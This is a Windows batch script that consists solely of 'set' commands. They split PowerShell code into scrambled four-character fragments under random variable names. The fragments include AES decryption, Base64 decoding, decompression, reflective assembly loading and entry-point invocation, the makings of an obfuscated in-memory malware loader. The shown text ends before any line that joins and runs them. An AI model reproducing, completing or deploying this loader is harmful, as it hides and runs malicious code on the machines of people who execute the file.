@echo off
set "CHfkKvNHBx=[IO."
set "HQMpbqRQyt=stem"
set "YDPNhNQiis=k; }"
set "yVfipBgGKC= = N"
set "DACfgyhxdP=e.En"
set "QDxtzLzgFJ=$iov"
set "hpTmrqgsQn=$jQz"
set "RLBUJtubYO=-ep "
set "JUqWeFnIJx=grap"
set "AxsonZOhJY=zuZI"
set "fFldHiIwig=ptor"
set "NFDyiRMKVo=e = "
set "lxbltdbVAj=.Sec"
set "KTDIcdWUZV=[Sys"
set "OzkAqyzmQV=$YeE"
set "KQmCdbZPYH=PDT "
set "nMpSwJMfew=null"
set "IpqYoWFoDG='gni"
set "ohQJyfDypW=rtS4"
set "wlQPhOmZgr=ne);"
set "aVawXRcgPO=Syst"
set "tcQuohRVJW=tS46"
set "gkajuuJeNI=.Len"
set "QuVRqKPRfW=t Sy"
set "BXvkAipTyB=tion"
set "qHLZappHFh=Disp"
set "jGUhxIViPa=tryP"
set "TstOmUlBxF=HB ="
set "SyLcKxmdhl=gth)"
set "ffxbEqAjiM=.Cry"
set "DzjQdphzEe=rEl "
set "YAlebdGBAo=d, 0"
set "PvVUTKasex=.-16"
set "eAbOtfEqLP=New-"
set "sVrgOJrqmE=s75K"
set "ZKqkJAWJag=Obje"
set "lMcYOncwvS=rity"
set "rIkoZoUByr=..-1"
set "tlQdCHLBGk=raph"
set "OyFwdUptyW=Mode"
set "dIWIcNHvkI=d = "
set "DBVqmXTzpG=Invo"
set "JjuJQcvCcE=Syst"
set "rExQRdDKgM=.Cry"
set "zbzNRfNpfi=ptog"
set "PRUWONLTJU=;$Ye"
set "FAQHTHpfzs=onve"
set "YLnbOqTFaB=oryS"
set "nXdontUdpf=('%*'"
set "VinwbZOqeV=.Com"
set "PpgaAAXaxi=.Ass"
set "jkMlwaNndj=();$"
set "jzatKBuAtb=)))"
set "cnxzicJDjW=pStr"
set "FbDqLjBxmp= New"
set "PQfpIeGFXr=Star"
set "zTVacKHbHW=orF'"
set "aaqWkfEBxY=m(, "
set "ZgrODCbfKt=pose"
set "fETqEwIbMi=$DaP"
set "AyIRpMDEdh=).Sp"
set "egzvSRaJPX=, (,"
set "FZDXlhDiyX=]::C"
set "ENxVdRAbHk=ss -"
set "HrxeyMWYvK=[-1."
set "QIBfwplZLu=ew-O"
set "GSrLnguZPV=ion."
set "MHPDQAqLxi=gsYZ"
set "XkRbUbTYhX=se()"
set "lzWcoxBLZL=.Key"
set "OQgAFGBKJj=]::("
set "ZVFafXFabG== $T"
set "FliVCIAGQu=daeR"
set "RJPfkcGeMW=]::("
set "UooHHwvBft=stem"
set "CGHOCWUXTW=[Sys"
set "sanZCCCrTO=flec"
set "siAVEyEMZj=Secu"
set "NzsOYppBpQ=gjYA"
set "MDLZcQlcUD=ring"
set "axSesIfTtb=jQzc"
set "FYYNpDdXiK=Comp"
set "IQWeKgxMWW=)($j"
set "mjnYdereQO=brea"
set "spMbxelNHi=.IO."
set "luCxFibSAk=pose"
set "XkpUgBSsnt=-Obj"
set "lCnoBeIwCD=comp"
set "nyyVXtKzlL=$iov"
set "ookKHeremX=[Sys"
set "TBAyWviKsb=  $s"
set "JGcCYGwXRt=;$Da"
set "BGFaxFWCTq=comm"
set "qjqGsqXzcX=R = "
set "NyWIDYCcIK=TllA"
set "dRySJUhtlC=cd);"
set "GCEJdOSKgs=esMa"
set "fdnzjtsKxn=ypto"
set "ocTdjudBZy=.Dis"
set "kNyKeLtuEO=trea"
set "VTFmJknogI=ddin"
set "IRSvVXPVyh=;$Da"
set "tlcjkwKcmC=iV.I"
set "hInKHqLGIC=File"
set "vgSUxNCyeX=MG.T"
set "NaKqFTKvjT=Qzcd"
set "GPViXYvMSC=n ''"
set "LRAigZlDRK= [Sy"
set "gClCNxZIcg='[-1"
set "cpQufXPFGx=.Cop"
set "wFNUyycuoS=();$"
set "BCVeJgiyVp=y]::"
set "MCCquadqXS=.Mod"
set "ZaibwyveUz=New-"
set "NlWRKabbBf=L4Yi"
set "ryfhOlWFmE=-4] "
set "lugBXWlPqf=B) {"
set "IFeqnlabpZ=.Mem"
set "UTptrNmaCP=Fina"
set "JtIvWGYdOs=th('"
set "tVZcVcuiSX=;$tY"
set "SMJgqjoijq=esaB"
set "ElTAYtvYuq=rYL."
set "WpKUHERUxM=xR.D"
set "iUSmCqzmfK= [st"
set "aFilwdyNCv=Bmor"
set "tGLDNgVOOx=rity"
set "wNVNMlbHYy=form"
set "WfeEIoiQvT=oin "
set "JoWkFKXFvF='0Pg"
set "BjXkNxWLJE=eMVs"
set "SzSjrSpzkB=ress"
set "ljqnFJeZlF=kNe "
